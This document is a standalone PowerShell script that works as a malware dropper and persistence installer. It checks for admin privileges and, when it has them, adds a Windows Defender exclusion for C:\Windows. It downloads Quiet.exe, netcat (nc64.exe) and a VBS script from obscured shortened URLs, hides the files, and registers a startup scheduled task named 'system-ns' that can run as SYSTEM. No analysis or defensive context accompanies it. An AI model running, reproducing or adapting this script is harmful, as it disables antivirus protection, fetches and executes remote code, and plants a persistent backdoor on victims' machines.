# Function to check for administrative privileges
function Test-AdminRights {
    $output = & whoami /priv
    $privileges = $output | Select-String -Pattern "SeShutdownPrivilege|SeChangeNotifyPrivilege|SeUndockPrivilege|SeIncreaseWorkingSetPrivilege|SeTimeZonePrivilege"
    $privileges.Count
}

# Check if the user has more than the normal amount of privileges
$normalPrivilegeCount = 5 # Number of expected privileges for a non-admin user
$privilegeCount = Test-AdminRights

if ($privilegeCount -gt $normalPrivilegeCount) {
    # Admin rights detected

    # Installation directory
    $installPath = "C:\Windows"
    
    # Download script.vbs for admin users
    $scriptVbsUrl = "https://rb.gy/w3a7hb"

    # Windows Defender Exclusion
    Add-MpPreference -ExclusionPath $installPath
} else {
    # No admin rights

    # Installation directory
    $installPath = Join-Path $env:USERPROFILE "System"
    
    # Download script.vbs for non-admin users
    $scriptVbsUrl = "https://rb.gy/3lld2p"
}

# Create the installation directory if it doesn't exist
if (-not (Test-Path $installPath)) {
    New-Item -ItemType Directory -Path $installPath -Force | Out-Null
}

# File download paths
$quietTxtPath = Join-Path $installPath "Quiet.exe"
$nc64TxtPath = Join-Path $installPath "nc64.exe"
$scriptVbsPath = Join-Path $installPath "script.vbs"

# URLs for Quiet.exe and nc64.exe
$quietTxtUrl = "https://rb.gy/mx0i5"
$nc64TxtUrl = "https://rb.gy/guty9"

# Download files
Invoke-WebRequest -Uri $quietTxtUrl -OutFile $quietTxtPath
Invoke-WebRequest -Uri $nc64TxtUrl -OutFile $nc64TxtPath
Invoke-WebRequest -Uri $scriptVbsUrl -OutFile $scriptVbsPath

# Make the downloaded files hidden
attrib +H $quietTxtPath
attrib +H $nc64TxtPath
attrib +H $scriptVbsPath

# Create a scheduled task
$action = New-ScheduledTaskAction -Execute $scriptVbsPath
$trigger = New-ScheduledTaskTrigger -AtStartup

if ($privilegeCount -gt $normalPrivilegeCount) {
    # If admin rights, run as NT AUTHORITY\SYSTEM
    $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
} else {
    # If not admin, run as current user
    $principal = New-ScheduledTaskPrincipal -UserId $env:UserName -LogonType Interactive
}

$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable

# Register the task
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "system-ns" -Principal $principal -Settings $settings -Force
